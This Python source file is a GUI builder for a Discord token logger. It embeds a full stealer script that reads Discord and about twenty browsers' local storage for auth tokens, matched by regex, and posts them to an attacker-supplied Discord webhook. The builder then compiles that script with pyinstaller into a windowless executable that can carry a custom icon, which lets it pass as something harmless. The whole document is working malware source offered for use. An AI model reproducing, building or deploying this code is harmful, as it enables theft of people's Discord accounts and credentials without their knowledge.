# Discord Token Logger Builder, By: Euronymou5
# https://twitter.com/Euronymou51
# https://github.com/Euronymou5

import tkinter as tk
import tkinter.ttk as ttk
from tkinter import PhotoImage
from pygubu.widgets.pathchooserinput import PathChooserInput
from tkinter import filedialog
from tkinter.scrolledtext import ScrolledText
from pyautogui import alert, confirm
import os
import webbrowser
import subprocess
import time
import shutil

ventana = tk.Tk()
ventana.title("Discord Token Logger Builder")
logo = PhotoImage(file = "logo.png")
ventana.iconphoto(False, logo)
ventana.configure(background="#272727", height=500, width=500)

logger_file = """import os
if os.name != "nt":
    exit()
import os
import re
import json
from urllib.request import Request, urlopen
WEBHOOK = 'webnook'
PING_ME = True
def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + r'\\Discord',
        'Discord Canary': roaming + r'\\discordcanary',
        'Discord PTB': roaming + r'\\discordptb',
        'Google Chrome': local + r'\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + r'\\Opera Software\\Opera Stable',
        'Brave': local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + r'\\Yandex\\YandexBrowser\\User Data\\Default',
        'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable',
        'Edge': roaming + r'\\Microsoft\\Edge\\User Data',
        'Amigo': local + r'\\Amigo\\User Data',
        'Torch': local + r'\\Torch\\User Data',
        'Kometa': local + r'\\Kometa\\User Data',
        'Orbitum': local + r'\\Orbitum\\User Data',
        'CentBrowser': local + r'\\CentBrowser\\User Data',
        '7Star': local + r'\\7Star\\7Star\\User Data',
        'Sputnik': local + r'\\Sputnik\\Sputnik\\User Data',
        'Chrome SxS': local + r'\\Google\\Chrome SxS\\User Data',
        'Epic Privacy Browser': local + r'\\Epic Privacy Browser\\User Data',
        'Vivaldi': local + r'\\Vivaldi\\User Data',
        'Chrome Beta': local + r'\\Google\\Chrome Beta\\User Data',
        'Uran': local + r'\\uCozMedia\\Uran\\User Data',
        'Iridium': local + r'\\Iridium\\User Data',
        'Chromium': local + r'\\Chromium\\User Data'
    }
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f' **{platform}** '
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'```{token}``` '
        else:
            message += 'Tokens no encontradas. '
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
    try:
        req = Request(WEBHOOK, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
if __name__ == '__main__':
    main()
"""

remp_win = None

def move_func():
    rut = filedialog.askdirectory()
    shutil.move('output/logger.exe', rut)
    alert(text=f"logger.exe successfully moved to: {rut}", title="Discord Token Logger Builder")
    remp_win.destroy()
    build_func()
    
def del_func():
    os.remove('output/logger.exe')
    alert(text="logger.exe successfully removed.", title="Discord Token Logger Builder")
    remp_win.destroy()
    build_func()
    
def build_func():
    webhook = webhook_var.get()
    imagen = icono_image_var.get()
    valor = check_var.get()
    if valor == False:
        # -------------------------------------------
        if os.path.isfile('output/logger.exe'):
            global remp_win
            remp_win = tk.Toplevel(ventana)
            logo_tw = PhotoImage(file = "logo.png")
            remp_win.iconphoto(False, logo_tw)
            remp_win.title("Discord Token Logger Builder")
            remp_win.configure(height=80, width=400)
            warning_label = ttk.Label(remp_win)
            warning_label.configure(font="device",text='The file logger.exe already exists, it will be replaced, \ndo you want to move it to another path?')
            warning_label.place(anchor="nw", relx=0.07, rely=0.08, x=0, y=0)
            move_buton = ttk.Button(remp_win)
            move_buton.configure(text='Move File')
            move_buton.place(anchor="nw", relx=0.11, rely=0.59, x=0, y=0)
            move_buton.configure(command=move_func)
            button2 = ttk.Button(remp_win)
            button2.configure(text='Delete File')
            button2.place(anchor="nw", relx=0.56, rely=0.59, x=0, y=0)
            button2.configure(command=del_func)
                
        # -----------------------------------------------
        else:
            with open('logger.py', 'w') as logger_l:
                logger_l.write(logger_file.replace('webnook', webhook))
            alert(text="Compiling token logger to EXE...", title="Discord Token Logger Builder")
            process = subprocess.Popen(['pyinstaller', '--onefile', '--noconsole', 'logger.py'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            while True:
                output = process.stdout.readline()
                if not output:
                    break
                logs_b.insert(tk.END, output.decode())
                logs_b.see(tk.END)
        try:
            os.remove("logger.spec")
            shutil.rmtree('build')
            shutil.move("dist/logger.exe", "output")
            shutil.rmtree('dist')
            shutil.rmtree('__pycache__')
        except:
            pass
    elif valor == True:
        if not imagen.endswith('.ico'):
            al = confirm(text="The image is not .ico!, ¿do you want to open the ico converter website?", title="Discord Token Logger Builder", buttons=['OK', 'Cancel'])
            if al == "OK":
                webbrowser.open_new_tab('https://www.icoconverter.com/')
                
        if os.path.isfile('output/logger.exe'):
            remp_win = tk.Toplevel(ventana)
            logo_tw = PhotoImage(file = "logo.png")
            remp_win.iconphoto(False, logo_tw)
            remp_win.title("Discord Token Logger Builder")
            remp_win.configure(height=80, width=400)
            warning_label = ttk.Label(remp_win)
            warning_label.configure(font="device",text='The file logger.exe already exists, it will be replaced, \ndo you want to move it to another path?')
            warning_label.place(anchor="nw", relx=0.07, rely=0.08, x=0, y=0)
            move_buton = ttk.Button(remp_win)
            move_buton.configure(text='Move File')
            move_buton.place(anchor="nw", relx=0.11, rely=0.59, x=0, y=0)
            move_buton.configure(command=move_func)
            button2 = ttk.Button(remp_win)
            button2.configure(text='Delete File')
            button2.place(anchor="nw", relx=0.56, rely=0.59, x=0, y=0)
            button2.configure(command=del_func)
        else:
            with open('logger.py', 'w') as logger_l:
                logger_l.write(logger_file.replace('webnook', webhook))
            process = subprocess.Popen(['pyinstaller', '--onefile', '--noconsole', 'logger.py', f'--icon={imagen}'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            alert(text="Compiling token logger to EXE...", title="Discord Token Logger Builder")
            while True:
                output = process.stdout.readline()
                if not output:
                    break
                logs_b.insert(tk.END, output.decode())
                logs_b.see(tk.END)
            try:
                os.remove("logger.spec")
                shutil.rmtree('build')
                shutil.move("dist/logger.exe", "output")
                shutil.rmtree('dist')
                shutil.rmtree('__pycache__')
            except:
                pass

titulo_label = ttk.Label(ventana)
titulo_label.configure(background="#272727",font="{Verdana} 16 {bold}",foreground="#0dff2c",text='Discord Token Logger Builder')
titulo_label.place(anchor="nw", relx=0.15, rely=0.03, x=0, y=0)

webhook_entry = ttk.Entry(ventana)
webhook_var = tk.StringVar()
webhook_entry.configure(textvariable=webhook_var)
webhook_entry.place(anchor="nw",relwidth=0.5,relx=0.23,rely=0.15,x=0,y=0)

icon_label = ttk.Label(ventana)
icon_label.configure(background="#272727",font="{Verdana} 12 {bold}",foreground="#0dff2c",text='Icon:')
icon_label.place(anchor="nw", relx=0.11, rely=0.41, x=0, y=0)

icono_dir = PathChooserInput(ventana)
icono_image_var = tk.StringVar()
icono_dir.configure(mustexist=True,textvariable=icono_image_var,type="file")
icono_dir.place(anchor="nw", relx=0.02, rely=0.5, x=0, y=0)

logs_b = ScrolledText(ventana)
logs_b.configure(background="#272727",font="{Dubai} 8 {}",foreground="#ffffff")
logs_b.place(anchor="nw",relheight=0.44,relwidth=0.56,relx=0.39,rely=0.51,x=0,y=0)
logs_label = ttk.Label(ventana)
logs_label.configure(background="#272727",font="{Verdana} 12 {bold}",foreground="#0dff2c",text='Logs:')
logs_label.place(anchor="nw", relx=0.59, rely=0.44, x=0, y=0)

build_button = tk.Button(ventana)
build_button.configure(background="#272727",font="{Consolas} 12 {}",foreground="#ffffff",text='Build')
build_button.configure(command=build_func)
build_button.place(anchor="nw",relwidth=0.21,relx=0.37,rely=0.27,x=0,y=0)

webhook_label = tk.Label(ventana)
webhook_label.configure(background="#272727",font="{Calibri Light} 9 {bold}",foreground="#ffffff",text='Webhook Discord:')
webhook_label.place(anchor="nw", relx=0.23, rely=0.10, x=0, y=0)

check_var = tk.BooleanVar(value=False)
check_button = tk.Checkbutton(ventana)
check_button.configure(background="#272727",font="{Verdana} 10 {bold}",foreground="#0dff2c",text="Use custom icon", variable=check_var)
check_button.place(anchor="nw", relx=0.26, rely=0.41, x=0, y=0)

if __name__ == "__main__":
    ventana.mainloop()
